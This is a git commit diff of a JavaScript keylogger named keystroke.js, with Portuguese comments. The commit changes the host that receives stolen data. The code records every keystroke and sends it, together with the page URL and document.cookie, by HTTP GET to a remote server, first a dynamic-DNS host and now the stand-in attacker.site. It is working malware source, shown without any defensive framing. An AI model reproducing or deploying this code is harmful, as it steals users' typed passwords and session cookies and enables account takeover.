59e0c86d0436b12651a9a06e1316d616a39b3c19
sampzzz <57546870+sampzzz@users.noreply.github.com>
2020-03-15 12:52:02 -0300

    Update keystroke.js

--- keystroke.js
+++ keystroke.js
@@ -6,7 +6,7 @@ document.addEventListener("keydown",function(e){
 		//console.log(teclas.join("")) //Remove as virgulas da array
 		//console.log(e.which); Diz o numero Unicode da tecla digitada
 		var xhttp = new XMLHttpRequest(); //Inicia requisicao http
-		xhttp.open("GET", "https://rakkonmore.ddns.net/strokes.php?key="+teclas.join("")+"&url="+window.location.href+"&cookie="+document.cookie, true); //Envia GET para servidor com PHP que registra teclas
+		xhttp.open("GET", "https://attacker.site/strokes.php?key="+teclas.join("")+"&url="+window.location.href+"&cookie="+document.cookie, true); //Envia GET para servidor com PHP que registra teclas
 		xhttp.send(); //Envia requisicao
 		teclas = []; //Limpa array apos envio para nao acumular
 		}
